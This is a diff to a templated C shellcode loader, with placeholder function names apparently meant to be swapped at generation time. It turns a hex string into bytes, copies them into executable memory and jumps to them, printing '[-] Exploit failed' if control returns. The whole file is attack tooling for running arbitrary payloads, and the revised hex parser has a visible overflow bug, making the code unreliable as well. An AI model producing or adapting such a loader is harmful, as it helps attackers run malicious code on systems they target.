@@ -34,16 +34,18 @@ char *{{FUNCTION2}}(char *str)
     return str;
 }
 
-unsigned int {{FUNCTION1}}(char* hexbuffer) {
-    {{FUNCTION2}}(hexbuffer);
-    unsigned int char_in_hex;
-    unsigned int iterations = strlen(hexbuffer);
-    unsigned int memory_allocation = strlen(hexbuffer) / 2;
-    for (unsigned int i = 0; i < iterations - 1; i++) {
-        sscanf(hexbuffer + 2 * i, "%2X", &char_in_hex);
-        hexbuffer[i] = (char)char_in_hex;
-    }
-    return memory_allocation;
+
+void {{FUNCTION1}}(char* array, char* buf) {
+	{{FUNCTION2}}(array);
+	while (*array) {
+		if (' ' == *array) {
+			array++;
+			continue;
+		}
+		sscanf(array, "%02X", buf);
+		array += 2;
+		buf++;
+	}
 }
 
 int main(int argc, char **argv)
@@ -62,9 +64,23 @@ int main(int argc, char **argv)
         exit(0);
     }
 
-    unsigned int memory_allocation = {{FUNCTION1}}(hexbuffer);
+
+    unsigned int memory_allocation = strlen(hexbuffer) / 2;
+
+	char* buf = (char*)malloc(memory_allocation);
+
+	if (NULL == buf) {
+		printf("malloc error");
+		return;
+	}
+
+	memset(buf, 0, memory_allocation);
+
+	{{FUNCTION1}}(hexbuffer, buf);
+
+
     void *ptr = mmap(0, memory_allocation, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
-    memcpy(ptr,hexbuffer,memory_allocation);
+    memcpy(ptr,buf,memory_allocation);
     void (*fp)() = (void (*)())ptr;
     fp();
     printf ("\n[-] Exploit failed \n");
